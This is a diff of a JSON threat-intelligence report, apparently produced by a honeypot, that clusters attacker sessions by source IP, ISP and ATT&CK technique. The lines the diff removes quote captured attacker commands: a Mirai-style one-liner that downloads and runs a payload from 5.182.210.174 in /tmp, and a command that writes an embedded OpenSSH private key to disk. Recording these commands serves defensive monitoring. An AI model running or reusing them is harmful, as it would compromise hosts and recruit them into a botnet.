@@ -1,30 +1,17 @@
 {
-  "generated_at": "2026-08-23T08:34:16.226829+00:00",
-  "total_sessions_with_commands": 10,
-  "total_clusters": 6,
-  "campaign_clusters": 2,
-  "singleton_clusters": 2,
+  "generated_at": "2026-08-23T10:27:39.366862+00:00",
+  "total_sessions_with_commands": 4,
+  "total_clusters": 4,
+  "campaign_clusters": 1,
+  "singleton_clusters": 4,
   "highest_severity": "HIGH",
   "active_campaigns": [
-    {
-      "cluster_id": "CLU-001",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1105",
-        "T1070",
-        "T1140",
-        "T1059.004"
-      ]
-    },
     {
       "cluster_id": "CLU-003",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 2,
+      "session_count": 1,
+      "unique_ip_count": 1,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -37,67 +24,31 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "45.198.224.26"
+        "64.62.156.10"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "18bc48b47c351ba6",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
-        }
-      ],
+      "sequence_hash": "c65db0c4bc1c74cc",
+      "ttps": [],
       "representative_commands": [
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &",
-        "cd /tmp",
-        "wget http://5.182.210.174/ok",
-        "curl -O http://5.182.210.174/ok",
-        "chmod +x ok",
-        "sh ok",
-        "rm -rf ok",
-        "rm -rf ok.1",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &",
-        "cd /tmp"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-aa03b98d1c0f",
-          "src_ip": "45.198.224.26",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 24,
-          "timestamp": "2026-08-23T05:56:28.692873Z"
+          "session_id": "IR-e940ce54a6e4",
+          "src_ip": "64.62.156.10",
+          "country": "US",
+          "isp": "The Shadowserver Foundation, Inc.",
+          "command_count": 3,
+          "timestamp": "2026-08-23T08:00:06.087772Z"
         }
       ]
     },
@@ -110,24 +61,23 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "172.239.71.239"
+        "34.76.194.102"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "0084449e5825fe2e",
+      "sequence_hash": "6c2b02475f4c7e7e",
       "ttps": [],
       "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-        "Accept: */*",
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
         "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-4fa5a2830889",
-          "src_ip": "172.239.71.239",
-          "country": "US",
-          "isp": "Linode",
-          "command_count": 3,
-          "timestamp": "2026-08-23T06:45:15.219794Z"
+          "session_id": "IR-bae424c39f22",
+          "src_ip": "34.76.194.102",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-23T07:21:16.872906Z"
         }
       ]
     },
@@ -151,12 +101,11 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 2,
+      "session_count": 1,
       "unique_ips": [
-        "69.6.223.142",
-        "97.93.43.157"
+        "197.227.8.186"
       ],
-      "unique_ip_count": 2,
+      "unique_ip_count": 1,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -186,20 +135,12 @@
       ],
       "members": [
         {
-          "session_id": "IR-1d6cbf3e4f31",
-          "src_ip": "69.6.223.142",
-          "country": "BR",
-          "isp": "Newfold Digital, Inc.",
+          "session_id": "IR-45b6a9cad84c",
+          "src_ip": "197.227.8.186",
+          "country": "MU",
+          "isp": "MauritiusTelecom",
           "command_count": 2,
-          "timestamp": "2026-08-23T04:59:12.993861Z"
-        },
-        {
-          "session_id": "IR-b9601750f3b4",
-          "src_ip": "97.93.43.157",
-          "country": "US",
-          "isp": "Charter Communications LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-23T05:00:23.286287Z"
+          "timestamp": "2026-08-23T08:26:59.596038Z"
         }
       ]
     },
@@ -210,91 +151,11 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 2,
+      "session_count": 1,
       "unique_ips": [
-        "34.76.194.102",
-        "34.77.236.250"
-      ],
-      "unique_ip_count": 2,
-      "sequence_hash": "6c2b02475f4c7e7e",
-      "ttps": [],
-      "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "Accept-Encoding: gzip"
-      ],
-      "members": [
-        {
-          "session_id": "IR-c2d3a98971b0",
-          "src_ip": "34.76.194.102",
-          "country": "BE",
-          "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-23T05:47:15.985415Z"
-        },
-        {
-          "session_id": "IR-8bfa4bb2ad9a",
-          "src_ip": "34.77.236.250",
-          "country": "BE",
-          "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-08-23T06:27:14.334905Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "130.12.180.51"
+        "34.76.194.102"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "ccd29aff2c593ed4",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        }
-      ],
-      "representative_commands": [
-        "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p"
-      ],
-      "members": [
-        {
-          "session_id": "IR-8e6cef08869b",
-          "src_ip": "130.12.180.51",
-          "country": "DE",
-          "isp": "Virtualine Technologies",
-          "command_count": 1,
-          "timestamp": "2026-08-23T05:02:34.028221Z"
-        },
-        {
-          "session_id": "IR-933c3d98acfe",
-          "src_ip": "130.12.180.51",
-          "country": "DE",
-          "isp": "Virtualine Technologies",
-          "command_count": 1,
-          "timestamp": "2026-08-23T06:29:16.965292Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-006",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "34.76.194.102",
-        "34.77.236.250"
-      ],
-      "unique_ip_count": 2,
       "sequence_hash": "758d61f26a444483",
       "ttps": [],
       "representative_commands": [
@@ -302,20 +163,12 @@
       ],
       "members": [
         {
-          "session_id": "IR-61aeda8ba657",
+          "session_id": "IR-185dd6949a5b",
           "src_ip": "34.76.194.102",
           "country": "BE",
           "isp": "Google LLC",
           "command_count": 1,
-          "timestamp": "2026-08-23T05:47:24.609582Z"
-        },
-        {
-          "session_id": "IR-da61bb13a087",
-          "src_ip": "34.77.236.250",
-          "country": "BE",
-          "isp": "Google LLC",
-          "command_count": 1,
-          "timestamp": "2026-08-23T06:27:27.850950Z"
+          "timestamp": "2026-08-23T07:21:30.359295Z"
         }
       ]
     }
